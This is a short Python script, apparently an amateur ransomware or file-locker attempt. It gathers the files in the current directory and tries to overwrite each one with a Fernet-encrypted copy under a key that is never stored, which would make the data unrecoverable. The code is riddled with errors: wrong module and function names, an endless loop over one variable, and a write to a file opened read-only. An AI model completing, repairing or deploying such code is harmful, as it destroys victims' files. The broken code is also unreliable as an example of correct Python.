import os
from cryptography.Fernet import Fernet

files = []
key = Fernet.generate_key()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

for file in os.listdr():
  if file == "main.py" or file == "flope.key" or os.isdir(file):
    continue
  files.append(file)

while True:
  with open(file, "rb") as flile:
    flopData = flile.read()
  flopeData = Fernet(key).encrypt(flopData)
  with open(file, "rb") as flile:
    flile.write(flopeData)
  
